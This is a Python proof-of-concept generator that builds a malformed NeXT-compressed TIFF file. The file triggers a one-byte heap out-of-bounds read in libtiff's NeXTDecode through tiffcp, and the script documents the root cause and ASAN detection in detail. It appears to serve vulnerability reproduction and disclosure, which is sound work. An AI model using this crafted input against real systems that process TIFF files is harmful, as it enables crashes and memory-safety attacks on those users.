#!/usr/bin/env python3
"""
PoC generator for VULN 001: NeXTDecode OOB Read via Exhausted Compressed Data
and cc==-1 Check Bypass (tif_next.c, NeXTDecode(), CWE-125).

Vulnerability summary:
  At tif_next.c:69, `n = *bp++, cc--;` reads the per-scanline type byte
  unconditionally BEFORE checking whether cc==0 (no data left).  When the
  raw buffer is exhausted after the first scanline but the outer loop still
  expects a second scanline (occ > 0), this performs a 1-byte OOB read and
  sets cc to -1 (tsize_t is signed int32).  Inside the default (run-length)
  branch the only guard is `if (cc == 0) goto bad;` (line 119); with cc==-1
  that check is permanently false.

Trigger design:
  - ImageWidth = 1024 pixels, ImageLength = 2, RowsPerStrip = 2
  - FillOrder = 2 (FILLORDER_LSB2MSB): forces libtiff to use the HEAP code
    path in TIFFFillStrip instead of the mmap shortcut.  Without this flag
    libtiff maps the whole file read-only and ASAN cannot protect individual
    byte boundaries inside the page.  With FillOrder=2 the strip is copied
    into _TIFFmalloc(TIFFroundup(bytecount, 1024)) then bit-reversed.  ASAN
    tracks that allocation precisely.
  - StripByteCounts = 1024: the heap allocation is exactly 1024 bytes; ASAN
    poisons byte 1024 (the byte immediately after).
  - Strip data: 1024 x 0x80.  After TIFFReverseBits, 0x80 -> 0x01
    (binary: 10000000 -> 00000001), which encodes a NeXT run-length code
    with grey=0, count=1 (one pixel).
  - First scanline (imagewidth=1024): outer type byte + 1023 inner reads =
    exactly 1024 bytes consumed, filling 1024 pixels.  cc becomes 0.
  - occ decremented by tif_scanlinesize = 1024/8 = 128; still > 0 (=128).
  - Second scanline: line 69 reads byte[1024] which is in ASAN's right
    red zone -> "AddressSanitizer: heap-buffer-overflow, READ of size 1".

Trigger tool: tiffcp (tiffsplit uses TIFFReadRawStrip which skips the
decode path entirely; tiffcp uses TIFFReadEncodedStrip -> NeXTDecode).
"""

import struct
import os

# ---------------------------------------------------------------------------
# TIFF constants
# ---------------------------------------------------------------------------
TIFF_LITTLEENDIAN   = 0x4949
TIFF_MAGIC          = 42

TAG_IMAGEWIDTH              = 256
TAG_IMAGELENGTH             = 257
TAG_BITSPERSAMPLE           = 258
TAG_COMPRESSION             = 259
TAG_PHOTOMETRIC             = 262
TAG_FILLORDER               = 266
TAG_STRIPOFFSETS            = 273
TAG_SAMPLESPERPIXEL         = 277
TAG_ROWSPERSTRIP            = 278
TAG_STRIPBYTECOUNTS         = 279

TYPE_SHORT  = 3   # uint16
TYPE_LONG   = 4   # uint32

COMPRESSION_NEXT    = 32766   # 0x7FFE  NeXT 2-bit grey scale
FILLORDER_LSB2MSB   = 2       # forces heap path in libtiff

# ---------------------------------------------------------------------------
# Strip construction
# ---------------------------------------------------------------------------
# Each strip byte 0x80 = 0b10000000.
# TIFFReverseBits reverses bit order within each byte:
#   0x80 (10000000) -> 0x01 (00000001)
# After reversal, each code byte 0x01 encodes: grey=0, count=1 (one pixel).
# First scanline (imagewidth=1024):
#   type byte 0x01 -> grey=0, count=1 -> fill pixel 0
#   inner read 0x01 -> fill pixel 1
#   ...
#   inner read 0x01 -> fill pixel 1023
#   total: 1024 reads, 1024 pixels == imagewidth, break; cc=0
# Second scanline: reads byte[1024] -> ASAN heap-buffer-overflow.

IMAGE_WIDTH     = 1024
IMAGE_LENGTH    = 2
ROWS_PER_STRIP  = 2
STRIP_BYTECOUNT = IMAGE_WIDTH   # = 1024: one code byte per pixel for scanline 0

STRIP_DATA = bytes([0x80] * STRIP_BYTECOUNT)

# ---------------------------------------------------------------------------
# IFD construction helpers
# ---------------------------------------------------------------------------

def ifd_entry(tag, type_, count, value):
    return struct.pack('<HHII', tag, type_, count, value)


def build_tiff():
    # Layout:
    #   [0..7]   TIFF header
    #   [8..]    IFD: 2-byte count + 10*12-byte entries + 4-byte next IFD = 126 bytes
    #   [134..]  strip data (1024 bytes)

    n_entries    = 10
    header_size  = 8
    ifd_size     = 2 + n_entries * 12 + 4   # 126 bytes
    ifd_offset   = header_size              # 8
    strip_offset = ifd_offset + ifd_size    # 134

    entries = b''
    entries += ifd_entry(TAG_IMAGEWIDTH,      TYPE_LONG,  1, IMAGE_WIDTH)
    entries += ifd_entry(TAG_IMAGELENGTH,     TYPE_LONG,  1, IMAGE_LENGTH)
    entries += ifd_entry(TAG_BITSPERSAMPLE,   TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_COMPRESSION,     TYPE_SHORT, 1, COMPRESSION_NEXT)
    entries += ifd_entry(TAG_PHOTOMETRIC,     TYPE_SHORT, 1, 1)  # BlackIsZero
    entries += ifd_entry(TAG_FILLORDER,       TYPE_SHORT, 1, FILLORDER_LSB2MSB)
    entries += ifd_entry(TAG_STRIPOFFSETS,    TYPE_LONG,  1, strip_offset)
    entries += ifd_entry(TAG_SAMPLESPERPIXEL, TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_ROWSPERSTRIP,    TYPE_LONG,  1, ROWS_PER_STRIP)
    entries += ifd_entry(TAG_STRIPBYTECOUNTS, TYPE_LONG,  1, STRIP_BYTECOUNT)

    assert len(entries) == n_entries * 12

    header = struct.pack('<HHI', TIFF_LITTLEENDIAN, TIFF_MAGIC, ifd_offset)
    ifd    = struct.pack('<H', n_entries) + entries + struct.pack('<I', 0)

    tiff_bytes = header + ifd + STRIP_DATA

    assert len(tiff_bytes) == header_size + ifd_size + len(STRIP_DATA)
    assert strip_offset == 134

    return tiff_bytes


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    poc_dir  = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(poc_dir, 'vuln_001.tif')

    tiff_bytes = build_tiff()

    with open(out_path, 'wb') as fh:
        fh.write(tiff_bytes)

    scanline_bytes = IMAGE_WIDTH // 8   # = 128 (BitsPerSample=1)
    strip_out_size = IMAGE_LENGTH * scanline_bytes  # = 256

    print(f"[+] Written {len(tiff_bytes)} bytes to {out_path}")
    print(f"    ImageWidth={IMAGE_WIDTH}, ImageLength={IMAGE_LENGTH}")
    print(f"    StripByteCounts={STRIP_BYTECOUNT} -> _TIFFmalloc({STRIP_BYTECOUNT})")
    print(f"    FillOrder=2 (LSB2MSB) -> heap path, TIFFReverseBits applied")
    print(f"    Strip raw: 0x80*{STRIP_BYTECOUNT} -> after reversal: 0x01*{STRIP_BYTECOUNT}")
    print(f"    NeXT decode: scanline 0 consumes all {STRIP_BYTECOUNT} bytes (1px/code)")
    print(f"    scanline 1: reads byte[{STRIP_BYTECOUNT}] = ASAN red zone -> heap-buffer-overflow")
